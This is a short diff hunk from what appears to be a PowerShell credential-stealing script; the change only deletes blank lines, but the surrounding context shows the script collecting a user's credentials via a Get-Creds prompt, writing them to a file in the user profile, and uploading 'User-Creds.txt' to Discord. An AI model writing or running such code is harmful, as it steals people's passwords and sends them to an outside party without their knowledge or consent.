@@ -92,8 +92,6 @@ Add-Type -AssemblyName System.Windows.Forms
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-
 echo $creds >> $env:USERPROFILE\$FileName
 Upload-Discord -file "User-Creds.txt"
 
